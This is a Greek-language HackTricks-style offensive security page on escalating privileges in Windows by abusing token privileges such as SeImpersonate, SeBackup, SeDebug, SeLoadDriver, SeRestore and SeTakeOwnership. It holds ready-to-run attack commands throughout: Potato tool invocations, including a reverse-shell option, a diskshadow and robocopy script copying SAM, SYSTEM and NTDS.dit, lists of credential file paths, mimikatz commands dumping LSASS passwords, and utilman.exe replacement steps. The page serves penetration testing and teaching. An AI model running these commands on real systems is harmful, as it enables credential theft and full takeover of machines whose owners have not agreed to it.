# Abusing Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

Αν **δεν ξέρεις τι είναι τα Windows Access Tokens** διάβασε αυτή τη σελίδα πριν συνεχίσεις:


{{#ref}}
access-tokens.md
{{#endref}}

**Ίσως να μπορέσεις να κάνεις escalate privileges abusing the tokens που ήδη έχεις**

### SeImpersonatePrivilege

Αυτό είναι privilege που κατέχεται από κάθε process και επιτρέπει το impersonation (αλλά όχι creation) οποιουδήποτε token, εφόσον μπορεί να αποκτηθεί ένα handle προς αυτό. Ένα privileged token μπορεί να αποκτηθεί από μια Windows service (DCOM) προκαλώντας την να κάνει NTLM authentication against an exploit, και στη συνέχεια enabling the execution of a process με SYSTEM privileges. Αυτό το vulnerability μπορεί να εκμεταλλευτεί χρησιμοποιώντας διάφορα tools, όπως [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (which requires winrm to be disabled), [SweetPotato](https://github.com/CCob/SweetPotato), και [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Modern operator notes:

- **JuicyPotato is legacy**: σε Windows 10 1809+/Server 2019+, προτίμησε **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, ή **PrintSpoofer** ανάλογα με το ποιο RPC/COM surface είναι ακόμα reachable.
- Αν έχεις compromise ένα service που τρέχει ως **`LOCAL SERVICE`** ή **`NETWORK SERVICE`** και το `whoami /priv` δείχνει ένα **filtered token** χωρίς `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, ανάκτησε πρώτα το **default privilege set** του account (για παράδειγμα με **FullPowers**) και μετά ξαναδοκίμασε το potato family.
- Κάποια νεότερα forks είναι πιο operator-friendly από τα αρχικά tools. Για παράδειγμα, το **SigmaPotato** προσθέτει reflection/in-memory execution και modern Windows compatibility, ενώ το **PrintNotifyPotato** abuses το PrintNotify COM service και συχνά είναι χρήσιμο όταν το κλασικό Spooler path είναι disabled.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Είναι πολύ παρόμοιο με το **SeImpersonatePrivilege**, θα χρησιμοποιήσει την **ίδια μέθοδο** για να πάρει ένα privileged token.\
Έπειτα, αυτό το privilege επιτρέπει **να ανατεθεί ένα primary token** σε μια νέο/ανασταλμένη διαδικασία. Με το privileged impersonation token μπορείς να παραγάγεις ένα primary token (DuplicateTokenEx).\
Με το token, μπορείς να δημιουργήσεις μια **νέα διαδικασία** με 'CreateProcessAsUser' ή να δημιουργήσεις μια διαδικασία suspended και να **ορίσεις το token** (γενικά, δεν μπορείς να τροποποιήσεις το primary token μιας running process).

### SeTcbPrivilege

Αν έχεις ενεργοποιημένο αυτό το token μπορείς να χρησιμοποιήσεις **KERB_S4U_LOGON** για να πάρεις ένα **impersonation token** για οποιονδήποτε άλλο χρήστη χωρίς να ξέρεις τα credentials, να **προσθέσεις μια αυθαίρετη ομάδα** (admins) στο token, να ορίσεις το **integrity level** του token σε "**medium**", και να αναθέσεις αυτό το token στο **current thread** (SetThreadToken).

### SeBackupPrivilege

Το system αναγκάζεται να **παρέχει πλήρη read access** control σε οποιοδήποτε αρχείο (περιορισμένο σε read operations) από αυτό το privilege. Χρησιμοποιείται για **την ανάγνωση των password hashes των τοπικών λογαριασμών Administrator** από το registry, μετά την οποία μπορούν να χρησιμοποιηθούν εργαλεία όπως "**psexec**" ή "**wmiexec**" με το hash (τεχνική Pass-the-Hash). Ωστόσο, αυτή η τεχνική αποτυγχάνει υπό δύο συνθήκες: όταν ο Local Administrator account είναι disabled, ή όταν υπάρχει policy που αφαιρεί administrative rights από Local Administrators που συνδέονται remotely.\
Στην πράξη, το πιο αξιόπιστο built-in workflow είναι συνήθως **VSS + `robocopy /b`**: δημιουργείς/εκθέτεις ένα shadow copy, και μετά αντιγράφεις `SAM`/`SYSTEM` ή `NTDS.dit` σε **backup mode**, κάτι που παρακάμπτει τα file ACLs.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Μπορείς να **abuse this privilege** με:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- ακολουθώντας τον **IppSec** στο [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Ή όπως εξηγείται στην ενότητα **escalating privileges with Backup Operators** του:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Το δικαίωμα για **write access** σε οποιοδήποτε system file, ανεξάρτητα από το Access Control List (ACL) του αρχείου, παρέχεται από αυτό το privilege. Ανοίγει πολλές δυνατότητες για escalation, συμπεριλαμβανομένης της δυνατότητας να **modify services**, να κάνεις DLL Hijacking και να ορίζεις **debuggers** μέσω του Image File Execution Options, μεταξύ άλλων τεχνικών.

### SeCreateTokenPrivilege

Το SeCreateTokenPrivilege είναι ένα ισχυρό permission, ιδιαίτερα χρήσιμο όταν ένας χρήστης έχει τη δυνατότητα να impersonate tokens, αλλά και όταν λείπει το SeImpersonatePrivilege. Αυτή η δυνατότητα βασίζεται στην ικανότητα να impersonate ένα token που αντιπροσωπεύει τον ίδιο χρήστη και του οποίου το integrity level δεν υπερβαίνει αυτό του τρέχοντος process.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Είναι δυνατό να αξιοποιηθεί το SeCreateTokenPrivilege για EoP με impersonating tokens υπό συγκεκριμένες συνθήκες.
- **Conditions for Token Impersonation:** Η επιτυχής impersonation απαιτεί το target token να ανήκει στον ίδιο χρήστη και να έχει integrity level μικρότερο ή ίσο με το integrity level του process που προσπαθεί να κάνει impersonation.
- **Creation and Modification of Impersonation Tokens:** Οι χρήστες μπορούν να δημιουργήσουν ένα impersonation token και να το ενισχύσουν προσθέτοντας το SID (Security Identifier) ενός privileged group.

### SeLoadDriverPrivilege

Αυτό το privilege επιτρέπει να **load and unload device drivers** με τη δημιουργία ενός registry entry με συγκεκριμένες τιμές για `ImagePath` και `Type`. Επειδή το direct write access στο `HKLM` (HKEY_LOCAL_MACHINE) είναι restricted, πρέπει να χρησιμοποιηθεί το `HKCU` (HKEY_CURRENT_USER). Ωστόσο, για να γίνει το `HKCU` recognizable από τον kernel για driver configuration, πρέπει να ακολουθηθεί ένα συγκεκριμένο path.

Η σύγχρονη offensive χρήση είναι συνήθως **BYOVD** (bring your own vulnerable driver): φορτώνεις έναν **signed αλλά vulnerable** kernel driver και μετά χρησιμοποιείς τα IOCTLs του για να απενεργοποιήσεις protections ή να φτάσεις σε kernel code execution. Λάβε υπόψη ότι σε πρόσφατα Windows 11/Server builds το **Microsoft vulnerable driver blocklist** και/ή το **HVCI/Memory Integrity** συχνά σπάνε παλαιότερα public chains, οπότε τα κλασικά παραδείγματα τύπου `szkg64.sys` δεν είναι πλέον universally reliable.

Αυτό το path είναι `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, όπου το `<RID>` είναι το Relative Identifier του τρέχοντος χρήστη. Μέσα στο `HKCU`, πρέπει να δημιουργηθεί ολόκληρο αυτό το path, και να οριστούν δύο values:

- `ImagePath`, που είναι το path προς το binary που θα εκτελεστεί
- `Type`, με τιμή `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Πρόσβαση στο `HKCU` αντί για το `HKLM` λόγω restricted write access.
2. Δημιουργία του path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` μέσα στο `HKCU`, όπου το `<RID>` αντιπροσωπεύει το Relative Identifier του τρέχοντος χρήστη.
3. Ορισμός του `ImagePath` στο execution path του binary.
4. Ανάθεση του `Type` ως `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Περισσότεροι τρόποι να abuse αυτό το privilege στο [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Αυτό είναι παρόμοιο με το **SeRestorePrivilege**. Η κύρια λειτουργία του επιτρέπει σε ένα process να **αναλάβει την ownership ενός object**, παρακάμπτοντας την απαίτηση για explicit discretionary access μέσω της παροχής WRITE_OWNER access rights. Η διαδικασία περιλαμβάνει πρώτα την απόκτηση ownership του επιθυμητού registry key για σκοπούς εγγραφής, και στη συνέχεια την τροποποίηση του DACL ώστε να ενεργοποιηθούν write operations.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Αυτό το privilege επιτρέπει το **debug άλλων processes**, συμπεριλαμβανομένου του read και write στη memory. Μπορούν να χρησιμοποιηθούν διάφορες στρατηγικές για memory injection, ικανές να παρακάμπτουν τα περισσότερα antivirus και host intrusion prevention solutions, με αυτό το privilege.

Σε σύγχρονα Windows, θυμήσου ότι το `SeDebugPrivilege` συνήθως αρκεί για να ανοίξει **non-protected SYSTEM processes** και να κάνει duplicate τα tokens τους, αλλά **δεν** αποτελεί εγγύηση ότι μπορείς να αγγίξεις το **LSASS**. Αν είναι ενεργό το **RunAsPPL / LSA Protection**, τα non-protected processes δεν μπορούν να read ή να inject στο LSASS ακόμα κι αν υπάρχει το `SeDebugPrivilege`. Σε αυτήν την περίπτωση, κλέψε ένα token από κάποιο άλλο non-PPL SYSTEM process, ή κάνε chain με PPL bypass/BYOVD αντί να υποθέτεις ότι το `procdump` θα δουλέψει. Για πλήρες παράδειγμα token-copy με χρήση `SeDebugPrivilege` + `SeImpersonatePrivilege`, δες [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Θα μπορούσες να χρησιμοποιήσεις το [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) από το [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) για να **capture the memory of a process**. Συγκεκριμένα, αυτό μπορεί να εφαρμοστεί στη διεργασία **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, η οποία είναι υπεύθυνη για την αποθήκευση των user credentials αφού ένας χρήστης έχει κάνει επιτυχώς login σε ένα system.

Στη συνέχεια μπορείς να φορτώσεις αυτό το dump στο mimikatz για να αποκτήσεις passwords:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Αν θέλεις να αποκτήσεις ένα `NT SYSTEM` shell μπορείς να χρησιμοποιήσεις:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Αυτό το δικαίωμα (Perform volume maintenance tasks) επιτρέπει το άνοιγμα raw volume device handles (π.χ. \\.\C:) για direct disk I/O που παρακάμπτει τα NTFS ACLs. Με αυτό μπορείς να αντιγράψεις bytes οποιουδήποτε αρχείου στο volume διαβάζοντας τα underlying blocks, επιτρέποντας arbitrary file read ευαίσθητου υλικού (π.χ. machine private keys στο %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS μέσω VSS). Είναι ιδιαίτερα impactful σε CA servers, όπου η εξαγωγή του CA private key επιτρέπει τη δημιουργία ενός Golden Certificate για να impersonate οποιονδήποτε principal.

Δες λεπτομερείς techniques και mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{endref}}

## Check privileges
```
whoami /priv
```
Τα **tokens που εμφανίζονται ως Disabled** συνήθως μπορούν να ενεργοποιηθούν, οπότε συχνά μπορείς να abuse και τα _Enabled_ και τα _Disabled_ privileges.

### Enable All the tokens

Αν έχεις disabled privileges, μπορείς να χρησιμοποιήσεις το script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) για να ενεργοποιήσεις όλα τα tokens:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Ή το **script** ενσωματωμένο σε αυτό το [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Πλήρες token privileges cheatsheet στο [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), η παρακάτω περίληψη θα αναφέρει μόνο άμεσους τρόπους εκμετάλλευσης του privilege για απόκτηση admin session ή ανάγνωση ευαίσθητων αρχείων.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Ευχαριστώ [Aurélien Chalot](https://twitter.com/Defte_) για το update. Θα προσπαθήσω να το διατυπώσω ξανά σύντομα σε πιο recipe-like μορφή.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Ανάγνωση ευαίσθητων αρχείων με `robocopy /b` ή με ειδικά SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                | <p>- Ιδανικό για `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, και μερικές φορές `%WINDIR%\MEMORY.DMP`.<br><br>- Το `robocopy` είναι βολικό, αλλά τα dedicated SeBackup cmdlets/APIs είναι συχνά πιο ευέλικτα για locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Δημιουργία αυθαίρετου token, συμπεριλαμβανομένων local admin rights, με `NtCreateToken`.                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Διπλασιασμός ενός **non-PPL** SYSTEM token ή dump memory από unprotected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping συνήθως μπλοκάρεται αν είναι ενεργό το RunAsPPL/LSA Protection.</p><p>Script θα βρείτε στο [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Χρήση της οικογένειας **Potato** / named-pipe impersonation για εκκίνηση SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                            | <p>Πιο πρακτικό από service accounts όπως IIS APPPOOL, MSSQL, scheduled tasks, ή οποιοδήποτε context που ήδη κατέχει `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Load ένα signed-but-vulnerable kernel driver (BYOVD)<br>2. Χρήση των IOCTLs του driver για kernel R/W, απενεργοποίηση security tooling, ή elevation σε SYSTEM<br><br>Εναλλακτικά, το privilege μπορεί να χρησιμοποιηθεί για unload security-related drivers με <code>fltMC</code> builtin command, δηλ. <code>fltMC sysmondrv</code></p>                     | <p>Παλαιότεροι public drivers όπως ο <code>szkg64.sys</code> μπλοκάρονται ολοένα και περισσότερο στα modern Windows από το vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Εκκινήστε PowerShell/ISE με το SeRestore privilege παρόν.<br>2. Ενεργοποιήστε το privilege με <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Μετονομάστε το utilman.exe σε utilman.old<br>4. Μετονομάστε το cmd.exe σε utilman.exe<br>5. Κλειδώστε την console και πατήστε Win+U</p> | <p>Η επίθεση μπορεί να εντοπιστεί από κάποιο AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files" χρησιμοποιώντας το ίδιο privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Μετονομάστε το cmd.exe σε utilman.exe<br>4. Κλειδώστε την console και πατήστε Win+U</p>                                                                                                                                       | <p>Η επίθεση μπορεί να εντοπιστεί από κάποιο AV software.</p><p>Εναλλακτική μέθοδος βασίζεται στην αντικατάσταση service binaries που είναι αποθηκευμένα στο "Program Files" χρησιμοποιώντας το ίδιο privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipulate tokens ώστε να περιλαμβάνονται local admin rights. Μπορεί να απαιτεί SeImpersonate.</p><p>Προς επαλήθευση.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Ρίξτε μια ματιά σε αυτόν τον πίνακα που ορίζει Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Ρίξτε μια ματιά σε [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) σχετικά με privesc με tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
